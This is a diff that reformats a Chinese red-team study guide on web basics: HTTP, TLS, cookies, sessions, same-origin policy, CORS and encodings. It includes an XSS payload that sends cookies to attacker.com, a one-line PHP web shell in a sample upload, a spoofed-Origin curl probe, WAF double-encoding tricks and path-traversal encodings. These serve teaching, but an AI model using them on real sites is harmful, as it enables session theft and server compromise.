@@ -21,28 +21,28 @@ Web技术是互联网的核心，也是渗透测试中最常见的目标。
 Web技术栈全貌：
 ```mermaid
 flowchart TD
-    subgraph CLIENT[客户端]
-        BROWSER["浏览器<br/>HTML/CSS/JS"]
-        APP["移动 App"]
-        API_CLIENT["API 客户端"]
-    end
-    subgraph NETWORK[网络]
-        DNS
-        CDN
-        LB["负载均衡"]
-        WAF
-    end
-    subgraph SERVER[服务端]
-        WEB["Web 服务器<br/>Nginx/Apache"]
-        APP_SERVER["应用服务器<br/>PHP/Python/Java"]
-        DB["数据库<br/>MySQL/Redis"]
-        CACHE["缓存<br/>Memcached/Redis"]
-    end
-    CLIENT -->|HTTP/HTTPS| NETWORK
-    NETWORK --> WEB
-    WEB --> APP_SERVER
-    APP_SERVER --> DB
-    APP_SERVER --> CACHE
+ subgraph CLIENT[客户端]
+ BROWSER["浏览器<br/>HTML/CSS/JS"]
+ APP["移动 App"]
+ API_CLIENT["API 客户端"]
+ end
+ subgraph NETWORK[网络]
+ DNS
+ CDN
+ LB["负载均衡"]
+ WAF
+ end
+ subgraph SERVER[服务端]
+ WEB["Web 服务器<br/>Nginx/Apache"]
+ APP_SERVER["应用服务器<br/>PHP/Python/Java"]
+ DB["数据库<br/>MySQL/Redis"]
+ CACHE["缓存<br/>Memcached/Redis"]
+ end
+ CLIENT -->|HTTP/HTTPS| NETWORK
+ NETWORK --> WEB
+ WEB --> APP_SERVER
+ APP_SERVER --> DB
+ APP_SERVER --> CACHE
 ```
 
 红队需要理解整个技术栈，因为漏洞可能出现在任何一层。
@@ -53,11 +53,11 @@ HTTP (HyperText Transfer Protocol) 是应用层协议，基于TCP（默认端口
 无状态协议：每个请求独立，服务器不保存客户端状态。
 
  HTTP版本历史：
-  HTTP/0.9 (1991) - 仅GET，无头部，无状态码
-  HTTP/1.0 (1996) - 引入头部、状态码、POST/HEAD方法，RFC 1945
-  HTTP/1.1 (1997) - 持久连接(Keep-Alive)、管道化、Host头、范围请求，RFC 2616→7230-7235
-  HTTP/2   (2015) - 二进制帧、多路复用、头部压缩、服务器推送，RFC 7540
-  HTTP/3   (2022) - 基于QUIC (UDP)，0-RTT连接，RFC 9114
+ HTTP/0.9 (1991) - 仅GET，无头部，无状态码
+ HTTP/1.0 (1996) - 引入头部、状态码、POST/HEAD方法，RFC 1945
+ HTTP/1.1 (1997) - 持久连接(Keep-Alive)、管道化、Host头、范围请求，RFC 2616→7230-7235
+ HTTP/2 (2015) - 二进制帧、多路复用、头部压缩、服务器推送，RFC 7540
+ HTTP/3 (2022) - 基于QUIC (UDP)，0-RTT连接，RFC 9114
 
 红队关注：HTTP/2带来了新的攻击面（如HTTP/2降级攻击、HPACK炸弹）
 
@@ -80,43 +80,43 @@ HTTP (HyperText Transfer Protocol) 是应用层协议，基于TCP（默认端口
 【HTTP状态码完整对照表】
 
  1xx 信息响应 (Informational)
-  100 Continue            客户端应继续请求
-  101 Switching Protocols 切换协议(如WebSocket升级)
-  103 Early Hints         预加载提示
+ 100 Continue 客户端应继续请求
+ 101 Switching Protocols 切换协议(如WebSocket升级)
+ 103 Early Hints 预加载提示
 
  2xx 成功 (Success)
-  200 OK                  请求成功
-  201 Created             资源创建成功（常用于PUT/POST后的响应）
-  202 Accepted            已接受，但尚未处理
-  204 No Content          成功但没有响应体
-  206 Partial Content     范围请求（断点续传）
+ 200 OK 请求成功
+ 201 Created 资源创建成功（常用于PUT/POST后的响应）
+ 202 Accepted 已接受，但尚未处理
+ 204 No Content 成功但没有响应体
+ 206 Partial Content 范围请求（断点续传）
 
  3xx 重定向 (Redirection)
-  301 Moved Permanently   永久重定向
-  302 Found               临时重定向（可能将POST变为GET）
-  303 See Other           查看其他（明确要求GET）
-  304 Not Modified        缓存有效，使用缓存
-  307 Temporary Redirect  临时重定向（保持请求方法）
-  308 Permanent Redirect  永久重定向（保持请求方法）
-  红队关注：开放重定向漏洞(Open Redirect)常用于钓鱼
+ 301 Moved Permanently 永久重定向
+ 302 Found 临时重定向（可能将POST变为GET）
+ 303 See Other 查看其他（明确要求GET）
+ 304 Not Modified 缓存有效，使用缓存
+ 307 Temporary Redirect 临时重定向（保持请求方法）
+ 308 Permanent Redirect 永久重定向（保持请求方法）
+ 红队关注：开放重定向漏洞(Open Redirect)常用于钓鱼
 
  4xx 客户端错误 (Client Error)
-  400 Bad Request         请求格式错误
-  401 Unauthorized        需要认证（未登录）
-  403 Forbidden           已认证但无权限（权限不足）
-  404 Not Found           资源不存在
-  405 Method Not Allowed  不支持的HTTP方法
-  413 Payload Too Large   请求体过大
-  414 URI Too Long        URL过长
-  429 Too Many Requests   请求频率过高（限流）
-  红队关注：403绕过技术（X-Forwarded-For、修改方法、路径fuzz）
+ 400 Bad Request 请求格式错误
+ 401 Unauthorized 需要认证（未登录）
+ 403 Forbidden 已认证但无权限（权限不足）
+ 404 Not Found 资源不存在
+ 405 Method Not Allowed 不支持的HTTP方法
+ 413 Payload Too Large 请求体过大
+ 414 URI Too Long URL过长
+ 429 Too Many Requests 请求频率过高（限流）
+ 红队关注：403绕过技术（X-Forwarded-For、修改方法、路径fuzz）
 
  5xx 服务端错误 (Server Error)
-  500 Internal Server Error  服务器内部错误
-  502 Bad Gateway            网关/代理收到无效响应
-  503 Service Unavailable    服务暂时不可用（过载/维护）
-  504 Gateway Timeout        网关超时
-  红队关注：500错误可能暴露堆栈信息导致信息泄露
+ 500 Internal Server Error 服务器内部错误
+ 502 Bad Gateway 网关/代理收到无效响应
+ 503 Service Unavailable 服务暂时不可用（过载/维护）
+ 504 Gateway Timeout 网关超时
+ 红队关注：500错误可能暴露堆栈信息导致信息泄露
 
 【HTTP请求头详解】
 
@@ -156,28 +156,28 @@ HTTP (HyperText Transfer Protocol) 是应用层协议，基于TCP（默认端口
 
 请求报文：
 ```
-  GET /index.php?id=1 HTTP/1.1
-  Host: www.example.com
-  User-Agent: Mozilla/5.0 (X11; Linux x86_64) ...
-  Accept: text/html,application/xhtml+xml,...
-  Accept-Language: zh-CN,zh;q=0.9
-  Connection: keep-alive
+ GET /index.php?id=1 HTTP/1.1
+ Host: www.example.com
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64) ...
+ Accept: text/html,application/xhtml+xml,...
+ Accept-Language: zh-CN,zh;q=0.9
+ Connection: keep-alive
 ```
 
 响应报文：
 ```
-  HTTP/1.1 200 OK
-  Date: Thu, 01 Jan 2024 12:00:00 GMT
-  Server: Apache/2.4.41 (Ubuntu)
-  Content-Type: text/html; charset=UTF-8
-  Content-Length: 1234
-  Set-Cookie: PHPSESSID=abc123def456; Path=/; HttpOnly
-  X-Frame-Options: DENY
+ HTTP/1.1 200 OK
+ Date: Thu, 01 Jan 2024 12:00:00 GMT
+ Server: Apache/2.4.41 (Ubuntu)
+ Content-Type: text/html; charset=UTF-8
+ Content-Length: 1234
+ Set-Cookie: PHPSESSID=abc123def456; Path=/; HttpOnly
+ X-Frame-Options: DENY
 
-  <!DOCTYPE html>
-  <html>
-  <head><title>Example</title></head>
-  ...
+ <!DOCTYPE html>
+ <html>
+ <head><title>Example</title></head>
+ ...
 ```
 
 ## 三、HTTPS/TLS握手过程
@@ -188,67 +188,67 @@ HTTPS = HTTP + SSL/TLS（默认端口443）
 
 ```mermaid
 sequenceDiagram
-    participant C as 客户端(Client)
-    participant S as 服务端(Server)
-    C->>S: ① ClientHello (TLS版本, 密码套件, 随机数1)
-    S-->>C: ② ServerHello (选定TLS版本, 密码套件, 随机数2)
-    S-->>C: ③ Certificate (SSL证书, 包含公钥)
-    S-->>C: ④ ServerHelloDone
-    C->>S: ⑤ ClientKeyExchange (公钥加密的PreMasterSecret)
-    C->>S: ⑥ ChangeCipherSpec (通知开始加密)
-    C->>S: ⑦ Finished (加密验证)
-    S-->>C: ⑧ ChangeCipherSpec (通知开始加密)
-    S-->>C: ⑨ Finished (加密验证)
-    Note over C,S: 双方派生会话密钥，加密通道建立
+ participant C as 客户端(Client)
+ participant S as 服务端(Server)
+ C->>S: ① ClientHello (TLS版本, 密码套件, 随机数1)
+ S-->>C: ② ServerHello (选定TLS版本, 密码套件, 随机数2)
+ S-->>C: ③ Certificate (SSL证书, 包含公钥)
+ S-->>C: ④ ServerHelloDone
+ C->>S: ⑤ ClientKeyExchange (公钥加密的PreMasterSecret)
+ C->>S: ⑥ ChangeCipherSpec (通知开始加密)
+ C->>S: ⑦ Finished (加密验证)
+ S-->>C: ⑧ ChangeCipherSpec (通知开始加密)
+ S-->>C: ⑨ Finished (加密验证)
+ Note over C,S: 双方派生会话密钥，加密通道建立
 ```
 
  密钥生成过程：
-  1. Client Random + Server Random + PreMaster Secret → Master Secret
-  2. Master Secret → 会话密钥(Session Keys)
-  3. 会话密钥包括:
-     - 客户端写入密钥(Client Write Key)
-     - 服务端写入密钥(Server Write Key)
-     - 客户端MAC密钥(Client MAC Key)
-     - 服务端MAC密钥(Server MAC Key)
-     - IV(初始化向量)
+ 1. Client Random + Server Random + PreMaster Secret → Master Secret
+ 2. Master Secret → 会话密钥(Session Keys)
+ 3. 会话密钥包括:
+ - 客户端写入密钥(Client Write Key)
+ - 服务端写入密钥(Server Write Key)
+ - 客户端MAC密钥(Client MAC Key)
+ - 服务端MAC密钥(Server MAC Key)
+ - IV(初始化向量)
 
  TLS 1.3 改进：
-  - 仅需1-RTT（往返时间）即可完成握手
-  - 支持0-RTT恢复（之前连接过的客户端可立即发送数据）
-  - 移除不安全算法：RSA密钥交换、SHA-1、RC4、DES、CBC模式
-  - 仅保留前向安全(AEAD)密码套件
-  - 握手加密化：ServerHello之后的报文全部加密
+ - 仅需1-RTT（往返时间）即可完成握手
+ - 支持0-RTT恢复（之前连接过的客户端可立即发送数据）
+ - 移除不安全算法：RSA密钥交换、SHA-1、RC4、DES、CBC模式
+ - 仅保留前向安全(AEAD)密码套件
+ - 握手加密化：ServerHello之后的报文全部加密
 
  HTTPS证书验证流程：
-  1. 客户端获取服务器证书
-  2. 验证证书的签名（用颁发者CA的公钥解密签名并比对哈希）
-  3. 验证证书有效期
-  4. 验证证书的域名（CN或SAN）
-  5. 检查证书吊销状态（CRL或OCSP）
-  6. 沿证书链验证到根证书（根证书预置于操作系统/浏览器）
+ 1. 客户端获取服务器证书
+ 2. 验证证书的签名（用颁发者CA的公钥解密签名并比对哈希）
+ 3. 验证证书有效期
+ 4. 验证证书的域名（CN或SAN）
+ 5. 检查证书吊销状态（CRL或OCSP）
+ 6. 沿证书链验证到根证书（根证书预置于操作系统/浏览器）
 
  红队关注点：
-  1. SSL剥离攻击(SSL Strip)：中间人将HTTPS降级为HTTP
-     - 工具：sslstrip, BetterCAP
-     - 防御：HSTS头
+ 1. SSL剥离攻击(SSL Strip)：中间人将HTTPS降级为HTTP
+ - 工具：sslstrip, BetterCAP
+ - 防御：HSTS头
 
-  2. 证书伪造与欺骗：
-     - 获取CA私钥→签发任意域名的证书（历史上多次发生）
-     - Let's Encrypt免费证书被恶意利用
+ 2. 证书伪造与欺骗：
+ - 获取CA私钥→签发任意域名的证书（历史上多次发生）
+ - Let's Encrypt免费证书被恶意利用
 
-  3. 弱TLS配置：
-     - 允许SSLv2/v3、TLS 1.0/1.1
-     - 支持RC4、MD5等弱算法
-     - 测试工具：sslscan, testssl.sh, nmap --script ssl-enum-ciphers
+ 3. 弱TLS配置：
+ - 允许SSLv2/v3、TLS 1.0/1.1
+ - 支持RC4、MD5等弱算法
+ - 测试工具：sslscan, testssl.sh, nmap --script ssl-enum-ciphers
 
-  4. 证书信息泄露：
-     - SAN列表暴露子域名
-     - 证书透明度(CT)日志可查询所有已签发证书
-     - 工具：crt.sh查询历史证书
+ 4. 证书信息泄露：
+ - SAN列表暴露子域名
+ - 证书透明度(CT)日志可查询所有已签发证书
+ - 工具：crt.sh查询历史证书
 
-  5. Heartbleed漏洞(CVE-2014-0160)：
-     - OpenSSL心跳扩展的缓冲区过读漏洞
-     - 可泄露服务器内存（包括私钥、会话数据）
+ 5. Heartbleed漏洞(CVE-2014-0160)：
+ - OpenSSL心跳扩展的缓冲区过读漏洞
+ - 可泄露服务器内存（包括私钥、会话数据）
 
 ## 四、Cookie机制
 
@@ -257,11 +257,11 @@ Cookie是存储在客户端的少量文本数据，由服务器通过Set-Cookie�
 
  Set-Cookie属性详解：
 
-  Set-Cookie: sessionId=abc123; Domain=.example.com; Path=/;
-              Expires=Thu, 01 Jan 2025 00:00:00 GMT;
-              Max-Age=3600; HttpOnly; Secure; SameSite=Lax
+ Set-Cookie: sessionId=abc123; Domain=.example.com; Path=/;
+ Expires=Thu, 01 Jan 2025 00:00:00 GMT;
+ Max-Age=3600; HttpOnly; Secure; SameSite=Lax
 
-  属性说明：
+ 属性说明：
 
 | 属性 | 说明 |
 |------|------|
@@ -273,19 +273,19 @@ Cookie是存储在客户端的少量文本数据，由服务器通过Set-Cookie�
 | SameSite | 防CSRF: 跨站时不发送Cookie。Strict完全禁止、Lax仅GET跨站、None不限制(需配合Secure)。红队: Lax/Strict增大CSRF利用难度 |
 
  Cookie与XSS的密切关系（红队核心知识点）：
-  1. document.cookie 可读取非HttpOnly的Cookie
-   2. XSS窃取Cookie的经典payload:
-     `<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>`
-  3. 即使设置了HttpOnly，XSS仍可：
-     - 利用当前会话直接进行恶意操作（不需窃取Cookie）
-     - 修改页面内容进行钓鱼
+ 1. document.cookie 可读取非HttpOnly的Cookie
+ 2. XSS窃取Cookie的经典payload:
+ `<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>`
+ 3. 即使设置了HttpOnly，XSS仍可：
+ - 利用当前会话直接进行恶意操作（不需窃取Cookie）
+ - 修改页面内容进行钓鱼
 
  Cookie安全最佳实践：
-  1. 必须设置HttpOnly和Secure
-  2. 设置SameSite=Lax或Strict
-  3. 合理设置过期时间，不宜过长
-  4. 敏感的会话Cookie应每次登录重新生成
-  5. 使用__Host-或__Secure-前缀增加安全约束
+ 1. 必须设置HttpOnly和Secure
+ 2. 设置SameSite=Lax或Strict
+ 3. 合理设置过期时间，不宜过长
+ 4. 敏感的会话Cookie应每次登录重新生成
+ 5. 使用__Host-或__Secure-前缀增加安全约束
 
 ## 五、Session机制
 
@@ -300,70 +300,70 @@ Cookie是存储在客户端的少量文本数据，由服务器通过Set-Cookie�
 | Token (JWT) | 客户端(自包含) | 无状态，天然支持分布式和跨域 | 签发后难作废，体积较大 |
 
  Session工作流程：
-  1. 用户登录成功
-  2. 服务器创建Session，生成唯一Session ID
-  3. Session ID通过Set-Cookie(通常HttpOnly)返回客户端
-  4. 客户端后续请求自动携带Cookie(内含Session ID)
-  5. 服务器根据Session ID查找对应的Session数据
+ 1. 用户登录成功
+ 2. 服务器创建Session，生成唯一Session ID
+ 3. Session ID通过Set-Cookie(通常HttpOnly)返回客户端
+ 4. 客户端后续请求自动携带Cookie(内含Session ID)
+ 5. 服务器根据Session ID查找对应的Session数据
 
  Session安全（红队关注点）：
-  1. Session ID预测：如果Session ID是可预测的(递增、时间戳) →
-     会话固定攻击 → 伪造他人会话
-  2. Session固定 (Session Fixation)：
-     - 攻击者获取一个有效Session ID
-     - 诱使受害者使用此ID登录
-     - 登录后攻击者即可使用受害者的身份
-     - 防御：登录后必须重新生成Session ID
-  3. Session ID泄露：
-     - 通过URL传递(URL重写) → Referer头泄露到外部
-     - 未使用HTTPS → 明文传输被嗅探
-     - 日志文件记录URL中的Session ID
-  4. 会话超时：设置的过期时间过长也是安全隐患
+ 1. Session ID预测：如果Session ID是可预测的(递增、时间戳) →
+ 会话固定攻击 → 伪造他人会话
+ 2. Session固定 (Session Fixation)：
+ - 攻击者获取一个有效Session ID
+ - 诱使受害者使用此ID登录
+ - 登录后攻击者即可使用受害者的身份
+ - 防御：登录后必须重新生成Session ID
+ 3. Session ID泄露：
+ - 通过URL传递(URL重写) → Referer头泄露到外部
+ - 未使用HTTPS → 明文传输被嗅探
+ - 日志文件记录URL中的Session ID
+ 4. 会话超时：设置的过期时间过长也是安全隐患
 
  Token验证流程（JWT为例，详见认证章节）：
-  1. 用户登录，服务器签名生成JWT返回客户端
-  2. 客户端存储JWT(localStorage/Cookie)
-   3. 每次请求在Authorization头带上：Bearer `<JWT>`
-  4. 服务器验证签名（不解密，仅验签）
-  5. 无需查数据库，无状态验证
+ 1. 用户登录，服务器签名生成JWT返回客户端
+ 2. 客户端存储JWT(localStorage/Cookie)
+ 3. 每次请求在Authorization头带上：Bearer `<JWT>`
+ 4. 服务器验证签名（不解密，仅验签）
+ 5. 无需查数据库，无状态验证
 
 ## 六、同源策略 (Same-Origin Policy)
 
 同源策略是Web安全的基石，由浏览器强制执行，限制不同源之间的资源访问。
 
  源(Origin)的定义：
-  三个要素完全一致才视为同源：
-    1. 协议 (Protocol): http vs https → 不同源
-    2. 域名 (Host):     example.com vs sub.example.com → 不同源
-    3. 端口 (Port):     80 vs 8080 → 不同源
+ 三个要素完全一致才视为同源：
+ 1. 协议 (Protocol): http vs https → 不同源
+ 2. 域名 (Host): example.com vs sub.example.com → 不同源
+ 3. 端口 (Port): 80 vs 8080 → 不同源
 
-  示例：
-  http://example.com:80/a/ 与  http://example.com/b/       → 同源
-  http://example.com      与  https://example.com          → 不同源(协议)
-  http://example.com      与  http://sub.example.com       → 不同源(域名)
-  http://example.com:80   与  http://example.com:8080      → 不同源(端口)
+ 示例：
+ http://example.com:80/a/ 与 http://example.com/b/ → 同源
+ http://example.com 与 https://example.com → 不同源(协议)
+ http://example.com 与 http://sub.example.com → 不同源(域名)
+ http://example.com:80 与 http://example.com:8080 → 不同源(端口)
 
-  注意：同源策略不阻止跨域资源的加载（如图片、脚本），但阻止跨域资源的读取。
+ 注意：同源策略不阻止跨域资源的加载（如图片、脚本），但阻止跨域资源的读取。
 
  同源策略的限制范围：
-  1. DOM访问：不同源的页面不能通过JS相互访问DOM
-  2. AJAX请求：不能向不同源发送XMLHttpRequest/fetch请求并读取响应
-  3. Cookie/LocalStorage：不能读取不同源的存储内容
+ 1. DOM访问：不同源的页面不能通过JS相互访问DOM
+ 2. AJAX请求：不能向不同源发送XMLHttpRequest/fetch请求并读取响应
+ 3. Cookie/LocalStorage：不能读取不同源的存储内容
 
  跨域资源加载（允许的跨域行为）：
-  - `<script src="...">` 加载JS
-  - `<img src="...">` 加载图片
-  - `<link href="...">` 加载CSS
-  - `<video>` `<audio>` 加载媒体
-  - `<iframe>` 嵌入页面（但不允许JS读取iframe内容）
-  - `<form>` 提交不限制（因此CSRF成为可能）
+ - `<script src="...">` 加载JS
+ - `<img src="...">` 加载图片
+ - `<link href="...">` 加载CSS
+ - `<video>` `<audio>` 加载媒体
+ - `<iframe>` 嵌入页面（但不允许JS读取iframe内容）
+ - `<form>` 提交不限制（因此CSRF成为可能）
 
  绕过同源策略的方式（部分）：
-  1. CORS（详见下节）—— 服务器主动允许
-   2. JSONP —— 利用`<script>`标签不受同源策略限制（老旧技术）
-  3. WebSocket —— wss连接不受同源策略严格限制
-  4. postMessage —— 跨窗口通信（需要目标配合）
-  5. DNS重绑定攻击 —— 利用DNS TTL变化使域名解析到内网IP
+ 1. CORS（详见下节）—— 服务器主动允许
+ 2. JSONP —— 利用`<script>`标签不受同源策略限制（老旧技术）
+ 3. WebSocket —— wss连接不受同源策略严格限制
+ 4. postMessage —— 跨窗口通信（需要目标配合）
+ 5. DNS重绑定攻击 —— 利用DNS TTL变化使域名解析到内网IP
 
 ## 七、CORS跨域资源共享
 
@@ -372,141 +372,141 @@ CORS (Cross-Origin Resource Sharing) 允许服务器声明哪些外部源可以�
 
  简单请求 vs 预检请求：
 
-  简单请求条件（全部满足）：
-    1. 方法：GET / HEAD / POST
-    2. 头部仅：Accept, Accept-Language, Content-Language, Content-Type
-    3. Content-Type仅：application/x-www-form-urlencoded, multipart/form-data, text/plain
-    4. 不读取响应流
+ 简单请求条件（全部满足）：
+ 1. 方法：GET / HEAD / POST
+ 2. 头部仅：Accept, Accept-Language, Content-Language, Content-Type
+ 3. Content-Type仅：application/x-www-form-urlencoded, multipart/form-data, text/plain
+ 4. 不读取响应流
 
-  满足条件 → 直接发请求，浏览器根据响应头决定是否拒绝
-  不满足   → 先发OPTIONS预检(Preflight)请求，通过后再发实际请求
+ 满足条件 → 直接发请求，浏览器根据响应头决定是否拒绝
+ 不满足 → 先发OPTIONS预检(Preflight)请求，通过后再发实际请求
 
  关键CORS响应头：
 
-  Access-Control-Allow-Origin: * 或 https://example.com
-    允许的来源（*表示任意来源）
-    红队：*意味着任何网站都可以跨域读取这个接口的响应
+ Access-Control-Allow-Origin: * 或 https://example.com
+ 允许的来源（*表示任意来源）
+ 红队：*意味着任何网站都可以跨域读取这个接口的响应
 
-  Access-Control-Allow-Credentials: true
-    是否允许携带Cookie/认证信息
-    注意：此时Allow-Origin不能是*，必须指定具体域名
+ Access-Control-Allow-Credentials: true
+ 是否允许携带Cookie/认证信息
+ 注意：此时Allow-Origin不能是*，必须指定具体域名
 
-  Access-Control-Allow-Methods: GET, POST, PUT, DELETE
-    允许的HTTP方法
+ Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+ 允许的HTTP方法
 
-  Access-Control-Allow-Headers: Content-Type, Authorization
-    允许的请求头
+ Access-Control-Allow-Headers: Content-Type, Authorization
+ 允许的请求头
 
-  Access-Control-Max-Age: 86400
-    预检结果缓存时间（秒）
+ Access-Control-Max-Age: 86400
+ 预检结果缓存时间（秒）
 
  CORS漏洞（红队核心）：
-  1. Origin反射漏洞：
-     如果服务器将请求的Origin原样返回到Access-Control-Allow-Origin，
-     且允许Credentials，任意网站都可以跨域读取敏感数据
+ 1. Origin反射漏洞：
+ 如果服务器将请求的Origin原样返回到Access-Control-Allow-Origin，
+ 且允许Credentials，任意网站都可以跨域读取敏感数据
 
-  2. 空Origin绕过：
-     某些实现对Origin=null（来自本地文件、sandbox iframe）放松限制
+ 2. 空Origin绕过：
+ 某些实现对Origin=null（来自本地文件、sandbox iframe）放松限制
 
-  3. 子域名接管 + CORS：
-     如果Allow-Origin设置的子域名存在过期/可接管的情况，
-     攻击者可接管该子域名后利用CORS
+ 3. 子域名接管 + CORS：
+ 如果Allow-Origin设置的子域名存在过期/可接管的情况，
+ 攻击者可接管该子域名后利用CORS
 
-  4. 正则匹配缺陷：
-     Allow-Origin: https://*.example.com → 弱正则可被绕过
-     如 https://attacker.example.com.attacker.com 被误判为匹配
+ 4. 正则匹配缺陷：
+ Allow-Origin: https://*.example.com → 弱正则可被绕过
+ 如 https://attacker.example.com.attacker.com 被误判为匹配
 
-  测试方法：
-    curl -H "Origin: https://attacker.com" https://target.com/api/user
+ 测试方法：
+ curl -H "Origin: https://attacker.com" https://target.com/api/user
 
 ## 八、URL编码/解码
 
 URL中只允许特定的ASCII字符集，其他字符需要编码。
 
  URL编码规则：
-  格式：%后跟两位十六进制数（大写）
-  例如：
-    空格 → %20 或 +
-    @    → %40
-    #    → %23
-    <    → %3C
-    >    → %3E
-    '    → %27
-    "    → %22
-    /    → %2F
-    \    → %5C
+ 格式：%后跟两位十六进制数（大写）
+ 例如：
+ 空格 → %20 或 +
+ @ → %40
+ # → %23
+ < → %3C
+ > → %3E
+ ' → %27
+ " → %22
+ / → %2F
+ \ → %5C
 
  URL结构：
-  scheme://user:password@host:port/path?query#fragment
-  \_____/   \__________/ \_____________/ \___/ \___/
-   协议       认证信息          位置         路径   片段
+ scheme://user:password@host:port/path?query#fragment
+ \_____/ \__________/ \_____________/ \___/ \___/
+ 协议 认证信息 位置 路径 片段
 
  红队URL编码技巧：
-  1. 双重编码绕过WAF：
-     原始：SELECT → 一次编码：%53%45%4C%45%43%54
-     → 二次编码：%25%35%33%25%34%35... (把%本身也编码为%25)
-     某些WAF只解码一次，如果后端解码两次则可绕过
+ 1. 双重编码绕过WAF：
+ 原始：SELECT → 一次编码：%53%45%4C%45%43%54
+ → 二次编码：%25%35%33%25%34%35... (把%本身也编码为%25)
+ 某些WAF只解码一次，如果后端解码两次则可绕过
 
-  2. 编码变体：
-     - 大写/小写：%2f 和 %2F 都可表示 /
-     - Unicode编码：%u002F (不同后端解析方式不同)
-     - 超长UTF-8编码（overlong encoding）:
-       / (0x2F) → %C0%AF(非法的2字节UTF-8表示，但某些解析器接受)
+ 2. 编码变体：
+ - 大写/小写：%2f 和 %2F 都可表示 /
+ - Unicode编码：%u002F (不同后端解析方式不同)
+ - 超长UTF-8编码（overlong encoding）:
+ / (0x2F) → %C0%AF(非法的2字节UTF-8表示，但某些解析器接受)
 
-  3. 路径遍历绕过：
-     ../ 的各种编码：
-     %2e%2e%2f
-     ..%2f
-     ..%5c (Windows反斜杠)
-     ..;/ (分号在某些框架中被忽略)
-     %2e%2e/ 或 ..%252f (二次编码)
+ 3. 路径遍历绕过：
+ ../ 的各种编码：
+ %2e%2e%2f
+ ..%2f
+ ..%5c (Windows反斜杠)
+ ..;/ (分号在某些框架中被忽略)
+ %2e%2e/ 或 ..%252f (二次编码)
 
-  4. SQL注入：URL编码空格为%20或+，绕过空格过滤
+ 4. SQL注入：URL编码空格为%20或+，绕过空格过滤
 
 ## 九、Base64编码原理
 
 Base64不是加密！是一种将二进制数据转换为ASCII文本的编码方式。
 
  编码原理：
-  1. 将每3个字节(24bit)分为4组，每组6bit
-  2. 6bit取值范围0-63，对应编码表(A-Z, a-z, 0-9, +, /)
-  3. 不足3字节时用0填充，输出中用=表示填充字节
+ 1. 将每3个字节(24bit)分为4组，每组6bit
+ 2. 6bit取值范围0-63，对应编码表(A-Z, a-z, 0-9, +, /)
+ 3. 不足3字节时用0填充，输出中用=表示填充字节
 
-  编码表：
-    0-25: A-Z
-   26-51: a-z
-   52-61: 0-9
-     62: +
-     63: /
+ 编码表：
+ 0-25: A-Z
+ 26-51: a-z
+ 52-61: 0-9
+ 62: +
+ 63: /
 
-  示例：
-    明文："Man"
-    ASCII: 77 97 110
-    二进制: 01001101 01100001 01101110
-    6bit组: 010011 010110 000101 101110
-    十进制: 19     22     5      46
-    Base64: T      W      F      u
-    结果："TWFu"
+ 示例：
+ 明文："Man"
+ ASCII: 77 97 110
+ 二进制: 01001101 01100001 01101110
+ 6bit组: 010011 010110 000101 101110
+ 十进制: 19 22 5 46
+ Base64: T W F u
+ 结果："TWFu"
 
-    "Ma" → "TWE=" (1字节填充)
-    "M"  → "TQ==" (2字节填充)
+ "Ma" → "TWE=" (1字节填充)
+ "M" → "TQ==" (2字节填充)
 
  Base64变体：
-  - URL安全Base64: 用 - 替代 +, _ 替代 /, 省略 =
-  - MIME Base64: 每76字符换行
+ - URL安全Base64: 用 - 替代 +, _ 替代 /, 省略 =
+ - MIME Base64: 每76字符换行
 
  红队关注点：
-  1. Base64用于数据混淆，常见于：
-     - HTTP Basic Auth: Authorization: Basic base64(username:password)
-     - JWT的Header和Payload编码
-     - 恶意代码混淆(一句话木马)
-     - 数据传输(如在Cookie中传数据)
-  2. 识别方法：字符串由A-Z a-z 0-9 + / = 组成，结尾常有=或==
-  3. 解码工具：base64 -d (Linux), CyberChef, Burp Suite Decoder
+ 1. Base64用于数据混淆，常见于：
+ - HTTP Basic Auth: Authorization: Basic base64(username:password)
+ - JWT的Header和Payload编码
+ - 恶意代码混淆(一句话木马)
+ - 数据传输(如在Cookie中传数据)
+ 2. 识别方法：字符串由A-Z a-z 0-9 + / = 组成，结尾常有=或==
+ 3. 解码工具：base64 -d (Linux), CyberChef, Burp Suite Decoder
 
  Base64 vs 加密的区别：
-  Base64: 可逆编码，无密钥，纯粹字符集映射，等于没加密
-  加密:   需要密钥，没有密钥理论上无法还原
+ Base64: 可逆编码，无密钥，纯粹字符集映射，等于没加密
+ 加密: 需要密钥，没有密钥理论上无法还原
 
 ## 十、前端基础
 
@@ -514,139 +514,139 @@ Base64不是加密！是一种将二进制数据转换为ASCII文本的编码方
 
  表单基本结构：
 ```
-  <form action="/login" method="POST">
-    <input type="text" name="username" placeholder="用户名">
-    <input type="password" name="password" placeholder="密码">
-    <input type="hidden" name="csrf_token" value="abc123">
-    <input type="submit" value="登录">
-  </form>
+ <form action="/login" method="POST">
+ <input type="text" name="username" placeholder="用户名">
+ <input type="password" name="password" placeholder="密码">
+ <input type="hidden" name="csrf_token" value="abc123">
+ <input type="submit" value="登录">
+ </form>
 ```
 
  输入类型(Input Type)：
-  text, password, hidden, checkbox, radio, file, submit, button,
-  email, number, date, url, tel, search
+ text, password, hidden, checkbox, radio, file, submit, button,
+ email, number, date, url, tel, search
 
-  hidden字段常用于传递CSRF Token等数据，攻击者可通过修改HTML注入/篡改
+ hidden字段常用于传递CSRF Token等数据，攻击者可通过修改HTML注入/篡改
 
  表单提交的Content-Type：
-  application/x-www-form-urlencoded (默认)
-    username=admin&password=123456
+ application/x-www-form-urlencoded (默认)
+ username=admin&password=123456
 
-  multipart/form-data (含文件上传)
-    ------Boundary
-    Content-Disposition: form-data; name="username"
-    admin
-    ------Boundary
-    Content-Disposition: form-data; name="file"; filename="shell.php"
-    <?php system($_GET['cmd']); ?>
-    ------Boundary--
+ multipart/form-data (含文件上传)
+ ------Boundary
+ Content-Disposition: form-data; name="username"
+ admin
+ ------Boundary
+ Content-Disposition: form-data; name="file"; filename="shell.php"
+ <?php system($_GET['cmd']); ?>
+ ------Boundary--
 
-  application/json (AJAX常用)
-    {"username":"admin","password":"123456"}
+ application/json (AJAX常用)
+ {"username":"admin","password":"123456"}
 
  红队关注点：
-  1. 客户端验证不可信！必须测试服务端验证
-  2. hidden字段可篡改(如修改价格、修改角色)
-  3. 文件上传利用（WebShell、绕过类型检查）
-  4. 表单自动填充可能泄露敏感信息
+ 1. 客户端验证不可信！必须测试服务端验证
+ 2. hidden字段可篡改(如修改价格、修改角色)
+ 3. 文件上传利用（WebShell、绕过类型检查）
